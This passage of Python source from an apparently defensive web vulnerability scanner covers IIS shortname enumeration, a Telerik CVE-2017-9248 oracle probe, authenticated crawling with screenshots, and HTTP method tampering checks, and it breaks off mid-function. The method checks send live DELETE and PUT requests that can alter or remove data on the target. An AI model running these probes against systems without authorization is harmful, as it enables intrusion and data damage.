# ── IIS Tilde Shortname Enumeration ──────────────────────────────────────────

def _enumerate_iis_shortname(target: dict, cfg: dict, out: "OutputManager",
                             sess: "requests.Session") -> None:
    """Run shortscan against an IIS target confirmed vulnerable to tilde
    shortname enumeration.  Called after nuclei's iis-shortname-detect
    template fires a positive.
    """
    shortscan = _find_tool("shortscan")
    if not shortscan:
        vc.log("[iis-shortname] shortscan not installed — skipping enumeration", "INFO")
        out.log_action_item(
            type="enumeration",
            recommended_tool="shortscan (go install github.com/bitquark/shortscan/cmd/shortscan@latest)",
            target=target.get("url", ""),
            ip=target.get("ip", ""),
            port=target["port"],
            hostname=target.get("hostname", ""),
            title="IIS Tilde Shortname Enumeration Required",
            description=(
                "Nuclei confirmed the IIS tilde shortname vulnerability. "
                "Install shortscan and re-run, or manually enumerate with: "
                "shortscan <target-url>"
            ),
            source_finding="Web Misconfiguration: IIS Tilde Shortname Vulnerability",
            priority="MEDIUM",
            scope="webapp",
        )
        return

    phase   = "vulnscan"
    url     = target["url"]
    port    = target["port"]
    scheme  = target["scheme"]
    timeout = cfg.get("timeout", 10)
    _pu     = urllib.parse.urlparse(url)
    origin  = f"{_pu.scheme}://{_pu.netloc}"

    vc.log("[iis-shortname] Starting IIS tilde shortname enumeration", "INFO")

    _bases = [origin]
    _app_path = _pu.path.rstrip("/")
    if _app_path:
        _parts = _app_path.split("/")
        for i in range(2, len(_parts) + 1):
            _b = origin + "/".join(_parts[:i])
            if _b not in _bases:
                _bases.append(_b)

    _all_files: list[str] = []
    _all_dirs:  list[str] = []
    _evidence_lines: list[str] = [
        "IIS Tilde Shortname Enumeration Results",
        "=" * 50,
        f"Target: {url}",
        f"Tool:   shortscan",
        "",
    ]

    _vs_cookie_str, _vs_auth_headers = _extract_subprocess_auth(sess)

    for _base in _bases:
        _ss_out = out.output_path(phase, f"shortscan_{_pu.hostname}")
        _ss_cmd = [shortscan, _base]
        if _vs_cookie_str:
            _ss_cmd.extend(["--header", f"Cookie: {_vs_cookie_str}"])
        for _hk, _hv in (_vs_auth_headers or {}).items():
            _ss_cmd.extend(["--header", f"{_hk}: {_hv}"])

        vc.log(f"[iis-shortname] shortscan → {_base}", "INFO")
        _ss_started = datetime.now().astimezone()
        try:
            _ss_proc = subprocess.run(
                _ss_cmd, capture_output=True, text=True,
                timeout=min(timeout * 30, 300),
            )
            _ss_ended = datetime.now().astimezone()
            _ss_stdout = _ss_proc.stdout or ""
            _ss_stderr = _ss_proc.stderr or ""

            out.log_command(
                "shortscan", _ss_cmd, _ss_out,
                tool_path=shortscan,
                stdout=_ss_stdout, stderr=_ss_stderr,
                started=_ss_started, ended=_ss_ended,
                exit_code=_ss_proc.returncode,
            )

            _ss_out.write_text(_ss_stdout, encoding="utf-8")

            _evidence_lines.append(f"Base: {_base}")
            _evidence_lines.append(f"Exit: {_ss_proc.returncode}")
            _evidence_lines.append(_ss_stdout[:4000])
            _evidence_lines.append("")

            for _line in _ss_stdout.splitlines():
                _line = _line.strip()
                if not _line or _line.startswith("[") or _line.startswith("Running"):
                    continue
                if "/" in _line:
                    _all_dirs.append(_line)
                elif _line and not _line.startswith("-"):
                    _all_files.append(_line)

        except subprocess.TimeoutExpired:
            _ss_ended = datetime.now().astimezone()
            vc.log(f"[iis-shortname] shortscan timed out on {_base}", "WARNING")
            _evidence_lines.append(f"Base: {_base} — TIMED OUT\n")
            _timeout_action_item(out, "shortscan", target, timeout * 30)
        except Exception as _ss_err:
            _ss_ended = datetime.now().astimezone()
            vc.error(f"[iis-shortname] shortscan error: {_ss_err}")
            _evidence_lines.append(f"Base: {_base} — ERROR: {_ss_err}\n")

    _ev_path = ""
    try:
        _ev_file = out.output_path(phase, f"iis_shortname_enum_{_pu.hostname}")
        _ev_file.write_text("\n".join(_evidence_lines), encoding="utf-8")
        _ev_path = str(_ev_file)
    except Exception:
        pass

    _total = len(_all_files) + len(_all_dirs)
    if _total > 0:
        _output_text = ""
        if _all_dirs:
            _output_text += f"Directories ({len(_all_dirs)}):\n"
            _output_text += "\n".join(f"  {d}" for d in _all_dirs[:20])
            if len(_all_dirs) > 20:
                _output_text += f"\n  ... and {len(_all_dirs) - 20} more"
            _output_text += "\n\n"
        if _all_files:
            _output_text += f"Files ({len(_all_files)}):\n"
            _output_text += "\n".join(f"  {f}" for f in _all_files[:20])
            if len(_all_files) > 20:
                _output_text += f"\n  ... and {len(_all_files) - 20} more"

        out.add_finding(
            title="Enumeration: IIS Tilde Directory Enumeration",
            url=url, port=port, risk="MEDIUM",
            description=(
                f"Active brute-force enumeration of IIS 8.3 short filenames "
                f"recovered {len(_all_files)} file(s) and {len(_all_dirs)} "
                f"directory(ies) from the web server. These names reveal the "
                f"first six characters of files and directories on disk, "
                f"potentially exposing backup files, configuration files, "
                f"source code, or hidden administrative paths."
            ),
            output=_output_text[:4000],
            sources="fracture-iis-shortname-enum",
            service=scheme,
            output_file=_ev_path,
            affected=url,
            owasp="A01:2025 Broken Access Control",
            nist="CM-7",
            remediation=(
                "Disable 8.3 filename generation: "
                "`fsutil behavior set disable8dot3 1` then restart IIS. "
                "Existing short names persist until files are recreated. "
                "Review enumerated names for sensitive files and restrict "
                "access to any exposed administrative or backup paths."
            ),
            command=" ".join(_ss_cmd),
            cwe=["CWE-200"],
            cvss_score=5.3,
            cvss_vector="CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N",
        )
        vc.log(
            f"[iis-shortname] Enumeration found {_total} name(s) "
            f"({len(_all_files)} files, {len(_all_dirs)} dirs)", "SUCCESS")
    else:
        vc.log("[iis-shortname] Enumeration returned no results", "INFO")

    vc.log("[iis-shortname] Enumeration complete", "SUCCESS")


# DialogHandler CVE-2017-9248 probe: invalid key causes a different response
# than a valid key, enabling a timing/content oracle.
_TELERIK_DH_PROBE_PARAMS = "?DialogHandler&dp=1"


def _parse_telerik_version(ver_str: str) -> "tuple[int, ...] | None":
    """Parse a Telerik version string like '2023.3.1010.45' into a comparable tuple."""
    try:
        parts = ver_str.strip().split(".")
        return tuple(int(p) for p in parts)
    except (ValueError, AttributeError):
        return None


def _telerik_version_str(ver_tuple: "tuple[int, ...]") -> str:
    """Convert a version tuple back to a dotted string."""
    return ".".join(str(p) for p in ver_tuple)


# ── Main function ───────────────────────────────────────────────────────────

def _validate_telerik(target: dict, cfg: dict, out: "OutputManager",
                      sess: "requests.Session") -> None:
    """Validate Telerik UI installation: extract version, check CVE exposure,
    and perform targeted probes for known vulnerabilities.

    Called after nuclei detects Telerik presence (template-id matches
    telerik-dialoghandler or telerik-fileupload).
    """
    phase   = "vulnscan"
    url     = target["url"]
    timeout = cfg.get("timeout", 10)
    port    = target["port"]
    scheme  = target["scheme"]
    _pu     = urllib.parse.urlparse(url)
    origin  = f"{_pu.scheme}://{_pu.netloc}"

    vc.log("[telerik] Starting Telerik vulnerability validation", "INFO")

    # Build candidate base URLs — the Telerik handlers may be at the app root
    # or nested under the application path
    _app_path = _pu.path.rstrip("/")
    _bases = [origin]
    if _app_path:
        # Add each parent path segment
        _parts = _app_path.split("/")
        for i in range(2, len(_parts) + 1):
            _b = origin + "/".join(_parts[:i])
            if _b not in _bases:
                _bases.append(_b)

    # ── 1. Probe handler endpoints and extract version ────────────────────
    _detected_handlers: list = []
    _detected_version:  "tuple[int, ...] | None" = None
    _version_source:    str = ""
    _evidence_lines:    list = ["Telerik UI Vulnerability Validation", "=" * 50, ""]
    _handler_responses: dict = {}

    for _base in _bases:
        for _hpath in _TELERIK_HANDLER_PATHS + [_TELERIK_ASYNC_UPLOAD]:
            _probe_url = _base.rstrip("/") + "/" + _hpath
            try:
                r = sess.get(_probe_url, timeout=timeout, allow_redirects=False)
                _handler_responses[_probe_url] = r

                # A handler is "accessible" if it returns anything other than
                # 404/403/401/301-to-login
                if r.status_code in (404, 403, 401):
                    continue
                if r.status_code in (301, 302):
                    _loc = r.headers.get("Location", "")
                    if "login" in _loc.lower() or "error" in _loc.lower():
                        continue

                _detected_handlers.append({
                    "url": _probe_url,
                    "status": r.status_code,
                    "path": _hpath,
                })
                _evidence_lines.append(
                    f"Handler: {_hpath}\n"
                    f"  URL:    {_probe_url}\n"
                    f"  Status: {r.status_code}\n"
                    f"  Size:   {len(r.text or '')} bytes\n")

                # Try to extract version from response headers
                for _hdr in ("X-Telerik-Version", "X-AspNet-Version"):
                    _hv = r.headers.get(_hdr, "")
                    _ver = _TELERIK_VERSION_RE.search(_hv)
                    if _ver:
                        _pv = _parse_telerik_version(_ver.group(1))
                        if _pv and (not _detected_version or _pv > _detected_version):
                            _detected_version = _pv
                            _version_source = f"header {_hdr}"

                # Try to extract from response body
                if r.text:
                    for _vm in _TELERIK_VERSION_RE.finditer(r.text[:4000]):
                        _pv = _parse_telerik_version(_vm.group(1))
                        if _pv and (not _detected_version or _pv > _detected_version):
                            _detected_version = _pv
                            _version_source = f"response body of {_hpath}"

            except requests.exceptions.Timeout:
                vc.log(f"[telerik] Timeout probing {_probe_url}", "WARNING")
                _timeout_action_item(out, "Telerik probes", target, 0, priority="LOW")
            except Exception as _te:
                vc.error(f"[telerik] Error probing {_probe_url}: {_te}")

        # If we found handlers at this base, don't check deeper bases
        if _detected_handlers:
            break

    if not _detected_handlers:
        vc.log("[telerik] No accessible Telerik handlers found", "INFO")
        return

    vc.log(
        f"[telerik] Found {len(_detected_handlers)} handler(s)"
        + (f", version {_telerik_version_str(_detected_version)}"
           if _detected_version else ", version unknown"),
        "INFO")

    # ── 2. Version-based CVE cross-reference ──────────────────────────────
    _matched_cves: list = []
    if _detected_version:
        _evidence_lines.append(
            f"\nDetected Version: {_telerik_version_str(_detected_version)}"
            f" (source: {_version_source})\n")

        for _max_ver, _cve_id, _risk, _cve_desc, _cve_remed in _TELERIK_CVE_RANGES:
            # Compare only up to the number of components in the CVE range
            _cmp_ver = _detected_version[:len(_max_ver)]
            if _cmp_ver <= _max_ver:
                _matched_cves.append((_cve_id, _risk, _cve_desc, _cve_remed))
                _evidence_lines.append(
                    f"CVE Match: {_cve_id} ({_risk})\n"
                    f"  Affected: <= {_telerik_version_str(_max_ver)}\n"
                    f"  Detected: {_telerik_version_str(_detected_version)}\n"
                    f"  {_cve_desc}\n")

    # ── 3. DialogHandler CVE-2017-9248 active probe ───────────────────────
    _dh_vuln_confirmed = False
    _dh_handler = next(
        (h for h in _detected_handlers
         if "DialogHandler" in h["path"]), None)

    if _dh_handler:
        vc.log("[telerik] Probing DialogHandler for CVE-2017-9248 oracle", "INFO")
        _dh_base = _dh_handler["url"].split("?")[0]
        try:
            # Send two requests: one with an empty key, one with a random key.
            # CVE-2017-9248 manifests as a measurable difference in response
            # content or timing between valid/invalid encryption keys.
            _dh_r1 = sess.get(
                _dh_base + "?DialogParametersRecovery=1&dp=AAAA",
                timeout=timeout, allow_redirects=False)
            _dh_r2 = sess.get(
                _dh_base + "?DialogParametersRecovery=1&dp=BBBB",
                timeout=timeout, allow_redirects=False)

            _r1_len = len(_dh_r1.text or "")
            _r2_len = len(_dh_r2.text or "")

            _evidence_lines.append(
                f"\nDialogHandler CVE-2017-9248 Probe:\n"
                f"  Request 1 (dp=AAAA): {_dh_r1.status_code}, {_r1_len}B\n"
                f"  Request 2 (dp=BBBB): {_dh_r2.status_code}, {_r2_len}B\n")

            # The oracle exists when different invalid keys produce different
            # response lengths (the handler leaks info about key validity
            # through response size variation).
            if (_dh_r1.status_code == 200 and _dh_r2.status_code == 200
                    and abs(_r1_len - _r2_len) > 10):
                _dh_vuln_confirmed = True
                _evidence_lines.append(
                    f"  RESULT: Response size differs by {abs(_r1_len - _r2_len)}B "
                    f"→ oracle detected (CVE-2017-9248 CONFIRMED)\n")
            elif _dh_r1.status_code == 500 or _dh_r2.status_code == 500:
                # 500 on invalid key is also a signal — patched versions
                # return a generic error regardless of key validity
                _evidence_lines.append(
                    f"  RESULT: Server error on probe — may indicate "
                    f"vulnerability (requires manual verification)\n")
            else:
                _evidence_lines.append(
                    f"  RESULT: Responses consistent — oracle not detected\n")

        except Exception as _dh_err:
            vc.error(f"[telerik] DialogHandler probe error: {_dh_err}")
            _evidence_lines.append(f"  ERROR: {_dh_err}\n")

    # ── 4. Save evidence and emit findings ────────────────────────────────
    _ev_path = ""
    try:
        _ev_file = out.output_path(phase, "telerik_validation")
        _ev_file.write_text("\n".join(_evidence_lines), encoding="utf-8")
        _ev_path = str(_ev_file)
    except Exception:
        pass

    # Save individual handler responses as evidence
    for _h in _detected_handlers[:5]:
        try:
            _h_resp = _handler_responses.get(_h["url"])
            if _h_resp:
                _safe_name = re.sub(r'[^a-zA-Z0-9_.-]', '_', _h["path"])[:60]
                _h_ev = out.output_path(phase, f"telerik_{_safe_name}_response")
                _h_content = [
                    f"URL: {_h['url']}",
                    f"Status: {_h_resp.status_code}",
                    "",
                    "Response Headers:",
                ]
                for _hk, _hv in _h_resp.headers.items():
                    _h_content.append(f"  {_hk}: {_hv}")
                _h_content.append("")
                _h_content.append("Response Body (first 2000 chars):")
                _h_content.append((_h_resp.text or "")[:2000])
                _h_ev.write_text("\n".join(_h_content), encoding="utf-8")
        except Exception:
            pass

    # ── Emit findings ─────────────────────────────────────────────────────
    _handler_list = "\n".join(
        f"  {h['path']} → {h['status']}" for h in _detected_handlers)
    _ver_str = _telerik_version_str(_detected_version) if _detected_version else "unknown"

    if _dh_vuln_confirmed:
        # CRITICAL: CVE-2017-9248 oracle confirmed
        out.add_finding(
            title=f"Telerik UI Remote Code Execution (CVE-2017-9248) — Version {_ver_str}",
            url=url, port=port, risk="CRITICAL",
            description=(
                "The Telerik UI DialogHandler is vulnerable to CVE-2017-9248: a "
                "cryptographic weakness allows an attacker to brute-force the "
                "encryption key and upload arbitrary files (including web shells) "
                "to the server. Active probing confirmed a response-size oracle "
                "that leaks key validity information.\n\n"
                f"Detected version: {_ver_str}\n"
                f"Accessible handlers:\n{_handler_list}"
            ),
            output="\n".join(_evidence_lines[-20:]),
            sources="fracture-telerik", service=scheme,
            output_file=_ev_path,
            affected="\n".join(h["url"] for h in _detected_handlers),
            cves="CVE-2017-9248",
            owasp="A06:2025 Vulnerable and Outdated Components",
            nist="SI-2",
            remediation=(
                "1. IMMEDIATE: Restrict access to Telerik.Web.UI.DialogHandler.aspx "
                "via IIS URL Authorization or web.config.\n"
                "2. Upgrade Telerik UI to the latest version (2024.x+).\n"
                "3. Rotate the Telerik encryption keys in web.config.\n"
                "4. Audit the server for web shells in upload directories."
            ),
            **_TELERIK_CVE_V11.get("CVE-2017-9248", {}),
        )
        vc.log("[telerik] CVE-2017-9248 CONFIRMED — CRITICAL finding emitted", "SUCCESS")

    elif _matched_cves:
        # HIGH: Version in vulnerable range but exploit not actively confirmed
        _cve_list = ", ".join(c[0] for c in _matched_cves)
        _highest_risk = "CRITICAL" if any(c[1] == "CRITICAL" for c in _matched_cves) else "HIGH"
        out.add_finding(
            title=f"Telerik UI Vulnerable Version Detected: {_ver_str}",
            url=url, port=port, risk=_highest_risk,
            description=(
                f"Telerik UI version {_ver_str} is within the affected range "
                f"for {len(_matched_cves)} known CVE(s): {_cve_list}.\n\n"
                "Version-based matching indicates the installation is vulnerable, "
                "but active exploitation was not confirmed during this scan.\n\n"
                f"Accessible handlers:\n{_handler_list}\n\n"
                + "\n".join(f"- {c[0]} ({c[1]}): {c[2]}" for c in _matched_cves)
            ),
            output="\n".join(_evidence_lines),
            sources="fracture-telerik", service=scheme,
            output_file=_ev_path,
            affected="\n".join(h["url"] for h in _detected_handlers),
            cves=_cve_list,
            owasp="A06:2025 Vulnerable and Outdated Components",
            nist="SI-2",
            remediation=_matched_cves[0][3],  # Use remediation from first (most severe) CVE
            **_TELERIK_CVE_V11.get(_matched_cves[0][0], {}),
        )
        vc.log(f"[telerik] Version {_ver_str} matches {len(_matched_cves)} CVE(s)", "SUCCESS")

    else:
        # MEDIUM: Handler accessible, version not in known vulnerable range
        out.add_finding(
            title=f"Telerik UI Handler Accessible: Version {_ver_str}",
            url=url, port=port, risk="MEDIUM",
            description=(
                f"Telerik UI handlers are publicly accessible (version: {_ver_str}). "
                "While the detected version is not in the range of known CVEs, "
                "Telerik handlers should be restricted to authorized users only. "
                "Unrestricted handler access increases the attack surface.\n\n"
                f"Accessible handlers:\n{_handler_list}"
            ),
            output="\n".join(_evidence_lines),
            sources="fracture-telerik", service=scheme,
            output_file=_ev_path,
            affected="\n".join(h["url"] for h in _detected_handlers),
            owasp="A06:2025 Vulnerable and Outdated Components",
            nist="SI-2",
            remediation=(
                "1. Restrict access to Telerik handler endpoints via IIS URL "
                "Authorization or web.config <location> rules.\n"
                "2. Keep Telerik UI updated to the latest version.\n"
                "3. Monitor Telerik security advisories at "
                "https://www.telerik.com/support/whats-new/aspnet-ajax/release-history"
            ),
        )
        vc.log(f"[telerik] Handler accessible, version {_ver_str} — MEDIUM finding", "SUCCESS")


def _phase_auth_recon(target: dict, cfg: dict, pm: ProgressManager,
                      out: OutputManager, auth_sess: requests.Session,
                      crawl_data: dict) -> dict:
    phase   = "auth_recon"
    url     = target["url"]
    timeout = cfg.get("timeout", 10)
    vc.status(phase, "Auth Recon", "running", "Crawling authenticated", 0, 3)

    # Crawl with authenticated session
    auth_crawl = _phase_crawl.__wrapped__ if hasattr(_phase_crawl, "__wrapped__") else None
    # Re-crawl with auth session
    visited:    set  = set()
    queue_urls: list = [(url, 0)]
    auth_forms: list = []
    auth_links: list = []
    page_count        = 0
    max_pages = cfg.get("crawl_max_pages", 150)
    max_depth = cfg.get("crawl_depth", 3)

    while queue_urls and page_count < max_pages:
        current_url, depth = queue_urls.pop(0)
        _norm_cur = current_url.rstrip("/")
        if _norm_cur in visited:
            continue
        visited.add(_norm_cur)
        page_count += 1
        _cur_path = urllib.parse.urlparse(current_url).path or "/"
        vc.status(phase, "Auth Recon", "running",
                  f"Auth crawl {page_count}/{max_pages} — {_cur_path}  "
                  f"(queue: {len(queue_urls)}, links: {len(auth_links)}, "
                  f"forms: {len(auth_forms)})",
                  page_count, max_pages)
        data = _crawl_page(current_url, auth_sess, timeout, url)
        if data["error"]:
            continue
        auth_forms.extend(data["forms"])
        auth_links.extend(data["links"])
        if depth < max_depth:
            for link in data["links"]:
                _lp = urllib.parse.urlparse(link).path or ""
                if (link.rstrip("/") not in visited
                        and _same_origin(url, link)
                        and not _LOGOUT_PATH_RE.search(_lp)):
                    queue_urls.append((link, depth + 1))

    vc.log(f"[auth_recon] Authenticated crawl: {page_count} pages", "INFO")
    vc.status(phase, "Auth Recon", "running", "Interesting endpoints", 1, 3)

    # Find admin-only endpoints
    _ar_scope = {target.get("hostname") or urllib.parse.urlparse(url).hostname or ""}
    _ar_ss_dir = out.root / "recon"
    _ar_ss_dir.mkdir(parents=True, exist_ok=True)
    _ar_ss_max = cfg.get("max_interesting_screenshots", 10)
    _ar_ss_count = 0
    for link in set(auth_links):
        if (_INTERESTING_PATH_RE.search(link)
                and _is_in_scope_url(link, _ar_scope)
                and _is_valid_endpoint_url(link)):
            # Save the authenticated fetch of this endpoint as evidence so
            # the operator can see what the page returned to a logged-in
            # user (often admin panels, account settings, internal APIs).
            _ar_evidence = ""
            try:
                _ar_r = auth_sess.get(link, timeout=timeout)
                _ar_rq, _ar_rp = _save_http_evidence(
                    out, phase,
                    f"auth_interesting_endpoint_{hashlib.md5(link.encode()).hexdigest()[:8]}",
                    _ar_r,
                )
                _ar_evidence = json.dumps([{
                    "url":  f"AUTHENTICATED GET {link} (HTTP {_ar_r.status_code})",
                    "req":  str(_ar_rq),
                    "resp": str(_ar_rp),
                }])
                _ar_status_line = (
                    f"HTTP {_ar_r.status_code}, "
                    f"{len(_ar_r.text or '')} bytes"
                )
            except Exception:
                _ar_status_line = "(fetch failed)"

            # Screenshot the interesting page (authenticated) — capped to
            # avoid excessive browser launches on endpoints-heavy scans.
            if _ar_ss_count < _ar_ss_max:
                _ar_ep_safe = re.sub(
                    r'[^a-zA-Z0-9_-]', '_', link.replace("://", "_"))[:50]
                _ar_ss_path = _ar_ss_dir / f"screenshot_interesting_{_ar_ep_safe}.png"
                try:
                    if _capture_screenshot_to(
                            link, _ar_ss_path, target, cfg,
                            auth_session=auth_sess):
                        _ar_ss_count += 1
                        out.add_finding(
                            title="Discovery: Web Screenshot Captured",
                            url=link, port=target["port"], risk="INFO",
                            description=(
                                f"Authenticated screenshot of interesting "
                                f"endpoint: {link}"
                            ),
                            affected=urllib.parse.urlparse(link).path or "/",
                            output=f"Saved: {_ar_ss_path.name}",
                            sources="fracture-screenshot",
                            service=target["scheme"],
                            output_file=str(_ar_ss_path),
                            owasp="A05:2025 Security Misconfiguration",
                            nist="CM-7",
                            remediation=(
                                "Review screenshot for exposed sensitive content."
                            ),
                        )
                        vc.log(
                            f"[auth_recon] Screenshot: {_ar_ss_path.name}",
                            "SUCCESS",
                        )
                except Exception:
                    pass

            out.add_finding(
                title="Authenticated Interesting Endpoint",
                url=link, port=target["port"], risk="INFO",
                description=(
                    f"Interesting endpoint accessible while authenticated: "
                    f"{link}. The authenticated GET response is saved as "
                    f"evidence."
                ),
                output=(
                    f"Endpoint:  {link}\n"
                    f"Reached:   authenticated session\n"
                    f"Response:  {_ar_status_line}"
                ),
                output_file=_ar_evidence,
                sources="fracture-auth-recon", service=target["scheme"],
                affected=link,
                owasp="A01:2025 Broken Access Control", nist="AC-3",
                remediation="Verify this endpoint enforces proper authorisation.",
            )

    # ── Screenshot login forms discovered during authenticated crawl ──
    # Forms with password fields that are NOT the configured login URL
    # may be secondary login portals, password-change forms, or admin
    # panels.  Capture a screenshot of each unique page hosting such a
    # form (capped to avoid excessive browser launches).
    _lf_ss_done: set = set()
    _lf_ss_max  = 5
    _lf_configured_login = (
        cfg.get("auth", {}).get("login_url", "").strip().rstrip("/")
    )
    for _lf in auth_forms:
        _lf_has_password = any(
            i.get("type", "").lower() == "password"
            for i in _lf.get("inputs", [])
        )
        if not _lf_has_password:
            continue
        _lf_page_url = _lf.get("page_url") or _lf.get("action", url)
        _lf_norm = _lf_page_url.rstrip("/")
        # Skip the configured login URL — already screenshotted separately
        if _lf_norm == _lf_configured_login:
            continue
        if _lf_norm in _lf_ss_done or len(_lf_ss_done) >= _lf_ss_max:
            continue
        _lf_ss_done.add(_lf_norm)
        _lf_safe = re.sub(r'[^a-zA-Z0-9_-]', '_',
                          _lf_page_url.replace("://", "_"))[:50]
        _lf_ss_path = _ar_ss_dir / f"screenshot_loginform_{_lf_safe}.png"
        try:
            if _capture_screenshot_to(_lf_page_url, _lf_ss_path, target, cfg,
                                      auth_session=auth_sess):
                _lf_rel = urllib.parse.urlparse(_lf_page_url).path or "/"
                out.add_finding(
                    title="Discovery: Web Screenshot Captured",
                    url=_lf_page_url, port=target["port"], risk="INFO",
                    description=(
                        f"Screenshot of login/password form page discovered "
                        f"during authenticated crawl: {_lf_page_url}"
                    ),
                    affected=_lf_rel,
                    output=f"Saved: {_lf_ss_path.name}",
                    sources="fracture-screenshot", service=target["scheme"],
                    output_file=str(_lf_ss_path),
                    owasp="A07:2025 Identification and Authentication Failures",
                    nist="IA-8",
                    remediation=(
                        "Review screenshot for exposed sensitive content."
                    ),
                )
                vc.log(
                    f"[auth_recon] Login form screenshot: {_lf_ss_path.name}",
                    "SUCCESS",
                )
        except Exception:
            pass

    # ── API endpoint identification ────────────────────────────────────
    # When discovered endpoints contain /api/ paths or return JSON
    # responses, flag the existence of an API layer as LOW.
    _api_paths: list = []
    _ar_api_scope = {target.get("hostname") or urllib.parse.urlparse(url).hostname or ""}
    _api_path_re = re.compile(r'/api[/.]', re.I)
    for link in set(auth_links):
        if (_api_path_re.search(link)
                and _is_in_scope_url(link, _ar_api_scope)):
            _api_rel = urllib.parse.urlparse(link).path or link
            if _api_rel not in _api_paths:
                _api_paths.append(_api_rel)
    if _api_paths:
        _api_paths_sorted = sorted(set(_api_paths))
        _api_auth_ev_file = out.output_path("auth_recon", "api_endpoints_authenticated")
        try:
            _api_auth_ev_file.write_text(
                "API Endpoint Inventory (Authenticated Crawl)\n"
                f"Target: {url}\n"
                f"Count:  {len(_api_paths_sorted)}\n"
                "=" * 60 + "\n\n"
                + "\n".join(_api_paths_sorted),
                encoding="utf-8",
            )
            _api_auth_ev_path = str(_api_auth_ev_file.relative_to(out.root))
        except Exception:
            _api_auth_ev_path = ""
        out.add_finding(
            title="API Endpoint Identified",
            url=url, port=target["port"], risk="LOW",
            description=(
                f"{len(_api_paths_sorted)} API endpoint path(s) were discovered "
                f"during authenticated crawling, confirming the application "
                f"exposes a web API layer. API endpoints are subject to "
                f"OWASP API Security Top 10 testing."
            ),
            output="API paths:\n" + "\n".join(f"  {p}" for p in _api_paths_sorted),
            sources="fracture-auth-recon", service=target["scheme"],
            affected="\n".join(_api_paths_sorted),
            output_file=_api_auth_ev_path,
            owasp="A01:2025 Broken Access Control", nist="CM-7",
            remediation=(
                "Ensure all API endpoints enforce authentication and "
                "authorisation. Apply rate limiting and input validation. "
                "Review API endpoints against OWASP API Security Top 10."
            ),
        )
        vc.log(f"[auth_recon] API layer identified: {len(_api_paths_sorted)} endpoint(s)", "SUCCESS")
        # ── Action item: recommend Siphon for authenticated API testing ──
        out.log_action_item(
            type="api",
            recommended_tool="Siphon",
            target=url,
            ip=target.get("ip", ""),
            port=target["port"],
            hostname=target.get("hostname", ""),
            title="Authenticated API Layer Detected — Siphon Scan Recommended",
            description=(
                f"{len(_api_paths_sorted)} API endpoint(s) were discovered during "
                f"authenticated crawling at {url}. Recommend Siphon for "
                f"comprehensive OWASP API Security Top 10 testing with "
                f"authenticated session context."
            ),
            source_finding="API Endpoint Identified",
            priority="high",
            scope=target.get("scope", ""),
            metadata={
                "api_count": len(_api_paths_sorted),
                "source_phase": "auth_recon",
                "auth_state": "authenticated",
            },
        )

    vc.status(phase, "Auth Recon", "running", "User ID extraction", 2, 3)
    # Look for numeric/UUID IDs in links
    _id_re = re.compile(r'/(\d+)(?:/|$|[?#])')
    resource_ids: list = []
    for link in set(auth_links):
        for m in _id_re.finditer(link):
            resource_ids.append({"url": link, "id": int(m.group(1))})

    # ── ViewState analysis ──────────────────────────────────────────────────
    try:
        _vs_crawl_data = {"links": list(set(auth_links)), "forms": auth_forms}
        _check_viewstate(target, cfg, out, auth_sess, _vs_crawl_data)
    except Exception as _vs_exc:
        vc.error(f"[viewstate] Analysis failed: {_vs_exc}")

    vc.status(phase, "Auth Recon", "complete", "Done", 3, 3)
    vc.log("[auth_recon] Phase complete", "SUCCESS")
    return {"forms": auth_forms, "links": list(set(auth_links)), "resource_ids": resource_ids}


# ─────────────────────────────────────────────
# Phase 12: Authorization (IDOR)
# ─────────────────────────────────────────────
# ── HTTP Method Tampering validation ──────────────────────────────────────────
def _validate_method_functional(method, link, r, auth_sess, timeout,
                                _mt_base_hash, _mt_base_body):
    """Validate whether an accepted HTTP method actually changed server state.

    Returns (is_functional: bool, evidence_lines: list[str]).
    """
    evidence = []
    try:
        if method == "DELETE":
            # After DELETE, GET the same URL — if it still returns 200 with
            # same body hash, the DELETE was ignored.
            _del_check = auth_sess.get(link, timeout=timeout)
            _del_body = _del_check.text or ""
            _del_hash = hashlib.md5(
                _del_body.encode("utf-8", "replace")).hexdigest()
            evidence.append(f"Validation: GET after DELETE → {_del_check.status_code}")
            if _del_check.status_code == 200 and _del_hash == _mt_base_hash:
                evidence.append("Result: Resource unchanged — DELETE was ignored")
                return False, evidence
            elif _del_check.status_code in (404, 410):
                evidence.append("Result: Resource removed — DELETE is functional")
                return True, evidence
            elif _del_hash != _mt_base_hash:
                evidence.append("Result: Response body changed after DELETE")
                return True, evidence
            else:
                evidence.append("Result: Inconclusive (different status, same body)")
                return False, evidence

        elif method in ("PUT", "PATCH"):
            # Send a second request with a canary body, then GET to check
            # whether the response body was affected.
            _canary = f"_fracture_canary_{hashlib.md5(link.encode()).hexdigest()[:8]}"
            _canary_body = json.dumps({"_fracture_probe": _canary})
            _put_r = auth_sess.request(
                method, link, timeout=timeout,
                data=_canary_body,
                headers={"Content-Type": "application/json"})
            evidence.append(
                f"Validation: {method} with canary body → {_put_r.status_code}")

            _put_check = auth_sess.get(link, timeout=timeout)
            _put_body = _put_check.text or ""
            _put_hash = hashlib.md5(
                _put_body.encode("utf-8", "replace")).hexdigest()
            evidence.append(
                f"Validation: GET after {method} → {_put_check.status_code}")

            if _canary in _put_body:
                evidence.append(
                    f"Result: Canary value reflected — {method} is functional")
                return True, evidence
            elif _put_hash != _mt_base_hash:
                evidence.append(
                    f"Result: Response body changed after {method} "
                    f"(hash {_mt_base_hash[:8]}→{_put_hash[:8]})")
                return True, evidence
            else:
                evidence.append(
                    f"Result: Response unchanged — {method} was ignored")
                return False, evidence

    except Exception as _ve:
        evidence.append(f"Validation error: {_ve}")
    return False, evidence



def _phase_authorization(target: dict, cfg: dict, pm: ProgressManager,
                          out: OutputManager, auth_sess: requests.Session,
                          auth_recon_data: dict) -> None:
    phase   = "authorization"
    url     = target["url"]
    timeout = cfg.get("timeout", 10)
    resource_ids = auth_recon_data.get("resource_ids", [])
    vc.status(phase, "Authorization Testing", "running", "IDOR testing", 0, len(resource_ids))

    # ── Authz response validator ────────────────────────────────────────
    # Returns (is_bypass: bool, reason: str). Rejects the common false-
    # positive sources for HTTP-200 IDOR/BOLA checks:
    #   - 200 OK but the response is actually a login page (auth redirected
    #     us back to /login, but the framework served it as 200 instead of
    #     302 — common in SPA frameworks and custom apps).
    #   - 200 OK but the response is a generic "not found" / "access
    #     denied" 200-status error template.
    #   - 200 OK but the body is IDENTICAL to the baseline request — the
    #     server returns the same catch-all page for every ID (wildcard
    #     pattern; not an authorisation bypass).
    #   - 200 OK and the same response comes back without ANY auth cookie
    #     — the URL is just publicly accessible; nothing was bypassed.
